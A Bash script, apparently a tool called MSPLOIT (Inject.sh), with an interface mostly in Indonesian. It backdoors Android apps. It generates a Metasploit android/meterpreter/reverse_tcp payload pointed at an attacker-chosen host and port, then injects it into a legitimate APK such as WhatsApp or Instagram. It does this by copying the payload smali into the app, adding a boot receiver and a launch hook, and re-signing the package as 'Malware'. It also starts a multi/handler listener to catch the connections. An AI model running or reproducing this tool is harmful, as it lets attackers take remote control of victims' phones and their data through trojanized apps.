#!/bin/bash
#fix create payload manual msfvenom
#apt-get install lib32stdc++6 lib32ncurses6 lib32z1++ -y
# installing apktool 2.6.1
# check requirements

RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
BLACKBG="$(printf '\033[40m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"
YELLOW="$(printf '\e[1;33m')"



path=$(pwd)
spiner(){
bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
barlength=${#bar}
i=0
while ((i < 100));
do
	n=$((i*barlength / 100))
	printf "$ku1\r[%-${barlength}s]" "${bar:0:n}"
	((i += 1))
	sleep 0
	done
}

function baner() {

cat <<- EOF
 ${GREEN}__    __     ______     ______   __         ______     __     ______  
/\ "-./  \   /\  ___\   /\  == \ /\ \       /\  __ \   /\ \   /\__  _\ 
\ \ \-./\ \  \ \___  \  \ \  _-/ \ \ \____  \ \ \/\ \  \ \ \  \/_/\ \/ 
${WHITE} \ \_\ \ \_\  \/\_____\  \ \_\    \ \_____\  \ \_____\  \ \_\    \ \_\ 
  \/_/  \/_/   \/_____/   \/_/     \/_____/   \/_____/   \/_/     \/_/ 
                                                                       
                             ${BLUE}./Inject.sh
                   ${GREEN}Tested, Whatsapp, Instagram, Fb
            ${YELLOW}Tiktok, Telegram, Line, Twitter, Mobile Legend
                     ${WHITE}Version 1.1 Copyright @K1M4K-ID
                  ${BLUE}Github : https://github.com/K1M4K-ID
                             YT : K1M4K-ID


EOF
  #statements
}


spinLoader() {
    pid=$!
    spin='\|/-'
    i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) %4 ))
        printf "\r${BLUE}[${spin:$i:1}]${RESTORE} $PROG_MESSAGE"
        sleep .1
    done
    printf "\r ${GREEN}[-]${RESTORE} $COMP_MESSAGE"
    sleep 1;echo java_V=$(java -version 2>&1 | awk 'NR == 1 { gsub("\"",""); print $3}' | awk -F. '{print $1"."$2}')

}
clear
baner
printf "\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m please wait . . . .\n\n"


# Checking the current version of java thats installed
java_V=$(java -version 2>&1 | awk 'NR == 1 { gsub("\"",""); print $3}' | awk -F. '{print $1"."$2}' 2>/dev/null)
# Testing if java version is equal or greater than 1.8
declare $(awk -v version="$java_V" 'BEGIN{if(version>1.8){ print "java_Met=true"}}')
if [ "$java_Met" == "true" ]; then     
    sleep 0.5;printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m Java-Version 1.8 or greater is ${GREEN}Installed.${RESTORE}\n"
    mapfile -t pkg_depends < <(apt-cache depends apktool | cut -d':' -f2 | sed '/^apktool\b/d;/^i386\b/d;/headless/d')
    pwd=$(pwd)
    
    for depend in "${pkg_depends[@]}"; do 
        pkg_qry=$(dpkg-query -s $depend &>/dev/null ; echo $?)
        if [ $pkg_qry = 0 ]; then
            sleep 0.5;printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m$depend is ${GREEN}Installed.${RESTORE}\n"
        else 
            sleep 0.5;printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m$depend is ${RED}missing.${RESTORE}\n"
            MISSING+=($depend)
            [[ -e /tmp/repair_depends ]] || mkdir /tmp/repair_depends
            cd /tmp/repair_depends && apt-get download $depend &>/dev/null
            cd $pwd     
        fi
    
    done

    if [[ ! -z $MISSING ]]; then 
        (dpkg -i /tmp/repair_depends/* &>/dev/null) & 
        echo 
        PROG_MESSAGE="${YELLOW}Installing missing dependencies${RESTORE}"
        COMP_MESSAGE="${YELLOW}Installed dependencies${RESTORE}"
        spinLoader;echo              
    
        [[ -z ${MISSING[@]} ]] || echo -e "\n${YELLOW}The following dependencies were installed:\n" && sleep 2 && for depends in ${MISSING[@]}; do echo -e "${BLUE}$depends${RESTORE}"; done; sleep 2
        rm -r -f /tmp/repair_depends
    fi

else 
    sleep 0.5
    echo -e "${RED}[*] ${YELLOW}Java-Version 1.8 or greater is ${RED}Missing.${RESTORE}\n"    
    mapfile -t java_depends < <(apt-cache depends apktool | grep "headless" | cut -d':' -f2| sed 's/^[ \t]*//;/<java8-runtime-headless>/d' |sort -u)
    echo -e '${BLUE}Please select a ${YELLOW}\e[4mJava-Version\e[0m${BLUE} to be installed: \n${BLUE}'
    select opt in "${java_depends[@]}"; do
        if [ -z $opt ] || [ "$opt" == [a-zA-Z] ]; then
            echo -e "${RED}ERROR: ${YELLOW}Invalid option please choose a valid numerical value from menu${BLUE}"
        else
            echo -e "\n${GREEN}Installing: ${YELLOW}$opt${RESTORE}"
            apt-get install "$opt"
            break
        fi
    
    done
fi

_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS"
unset _JAVA_OPTIONS
alias java='java "$_SILENT_JAVA_OPTIONS"'

if [ -f /usr/local/bin/apktool ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apktool is ${GREEN}Installed.\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing apktool!\n"
    wget --no-check-certificate "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" -O /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool
    wget --no-check-certificate "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar" -O /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool.jar
    fi
    sleep 0.025
    
if [ -f /usr/bin/apksigner ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apksigner is ${GREEN}Installed.\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing apksigner!\n"
    apt-get install apksigner -y
    fi
    sleep 0.025

if [ -f /usr/bin/zipalign ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m zipalign is ${GREEN}Installed.\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing zipalign!\n"
    apt-get install zipalign -y
    fi
    sleep 0.025
    
if [ -f /usr/bin/java ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m jarsigner is ${GREEN}Installed.\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing jarsigner!\n"
    apt-get install openjdk-11-jdk -y
    fi
    sleep 0.025
    
printf "\n\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m selesai, happy hunting!!\n"
sleep 5
clear
function xyz()
{
 orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
}
function ovpn()
{
 vpn=$(zenity --title " Vpn Start " --filename=$path --file-selection --file-filter "*.ovpn" --text "chose the config (ovpn)" 2> /dev/null)
}
function sets_original(){
        clear
        baner
        printf '\033[31;1m'
        echo
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama backdoor  : "'\033[34;1m')" nama
        printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
        printf '\033[31;1m'
        spiner
        echo
        sleep 2
}

function inject_payloads(){
        sudo msfvenom -x $orig -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/$nama.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
}

function inject_payload(){
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
}


function listener_kali(){
        clear
        baner
        printf "\033[37;1m[\033[32;1m*\033[37;1m] masukan config portmap..\033[31;1m\n"
	sleep 5
	ovpn;xterm -title "start sniffing" -bg "#000000" -fg "#FFFFFF" -fa "Monospace" -fs 10 -e "openvpn --config $vpn" > /dev/null 2>&1 &
	sleep 5
        printf '\033[31;1m'
        echo
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip listener anda\033[31;1m\n"
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        sleep 0.025
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        sleep 0.025
        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] forward ip address anda, tun0(\033[31;1mforward\033[37;1m)\n"
        printf '\033[31;1m'
        spiner
        echo
        echo
        sleep 0.025
        ifconfig tun0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting apache2 && database (\033[32;1mruning\033[37;1m)\n"
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        service apache2 start > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] apache server\033[31;1m [\033[32;1mOK\033[31;1m]\n"
        spiner
        echo
        sleep 0.025
        service postgresql start > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] postgresql\033[31;1m   [\033[32;1mOK\033[31;1m]\n"
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting metasploit listener . . .\033[31;1m\n"
        spiner
        echo
        sleep 2
        clear
}

function listerners(){
    clear
    baner
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1mlisterner\033[32;1m android\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1mx\033[31;1m] \033[37;1mexit\033[31;1m\n\n"
    sleep 0.025
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
    if [ $xyz = "1"  ];
    then
    listener_kali
	msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
	clear
	listerners

	elif [ $xyz = "2"  ];
	then
	menu

	elif [ $xyz = "x"  ];
	then
	exit;

	else
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	clear
	listerners

	fi
}


# decompyle payload
#
function decompile_payload(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile payload\033[31;1m\n"
        spiner
        echo
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d -f $path/payload.apk
        spiner
        echo
}

# decompile original
#
function decompile_original(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile original\033[31;1m\n"
        spiner
        echo
        sudo apktool d -f -o $path/original $orig
        spiner
        echo
}

# rebuild payload original
#
function rebuild_original(){
	printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild backdoor please wait\033[31;1m\n"
        spiner
        echo
        sudo apktool b $path/original -o ori.apk
        spiner
        echo
}

# add permission dan hook
#
function perms()
{
 printf $ku""
 printf "\033[37;1m[\033[32;1m*\033[37;1m] menambahkan permission and hook smali\033[31;1m\n"
 spiner
 echo
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 android_nam=$tmp
}

# functions hook smali
#
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke : $hook_num \n"
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali : $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke : $hook_num \n"
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    printf '\033[31;1m'
    spiner
    printf "\n\033[37;1m[\033[31;1mx\033[37;1m] tidak ditemukan : $android_activity.smali\n"
    printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba lagi . . .\033[31;1m\n"
    spiner
    sleep 2
    echo
    printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    printf "\033[37;1minject Smali : $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    printf "\033[37;1mbaris ke : $hook_num \n"
    printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi
 fi
}

#
function clear_data(){
        rm -fr ori.apk payload payload.apk original && mv $nama.apk Malware
}

# sign backdoor file manual inject
#
function sign_orig(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] memeriksa .android/key.keystore untuk penandatanganan\033[31;1m\n"
        spiner
        echo
if [ ! -f .android/key.keystore ]; then
        printf "\033[37;1m[\033[31;1mx\033[37;1m] Kunci debug tidak ditemukan. membuatnya sekarang\033[31;1m\n"
        spiner
        echo
        if [ ! -d ".android"  ]; then
        mkdir .android > /dev/null
        fi
        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
fi
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba menandatangani paket dengan kunci android anda\033[31;1m\n"
        spiner
        echo
        jarsigner -keystore .android/key.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA ori.apk key > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] menandatangani aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba memverifikasi aplikasi backdoor anda, please wait\033[31;1m\n"
        spiner
        echo
        jarsigner -verify -verbose -certs ori.apk.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mengkompilasi ulang aplikasi\033[31;1m\n"
        spiner
        echo
        zipalign 4 ori.apk $nama.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verifikasi aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
        spiner

}


function backdoor_file(){
        sets_original
        inject_payload
        xyz
        decompile_payload
        decompile_original
        perms
        hook_smalies
        sleep 1
        rebuild_original
        sleep 1
        sign_orig
        sleep 1
        clear_data
        sleep 1
}

function run(){
sets_original
xyz
inject_payloads
read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] ENTER TO CONTINUE "'\033[34;1m')" lan
listerners
}

function menu(){
    clear
    baner
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minject backdoor android\033[37;1m [\033[31;1mV.1\033[37;1m]\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1minject backdoor android\033[37;1m [\033[31;1mV.2\033[37;1m]\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1mX\033[31;1m] \033[37;1mexit\033[31;1m\n\n"
    sleep 0.025
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
    if [ $xyz = "1"  ];
    then
    run
    #listener_kali
	#msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
	#clear
	listerners

    elif [ $xyz = "2"  ];
	then
	backdoor_file
    echo ""
    read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] ENTER TO CONTINUE "'\033[34;1m')" lan
    listerners

	elif [ $xyz = "x"  ];
	then
	exit;

	else
    printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	clear
	menu

	fi
}

menu



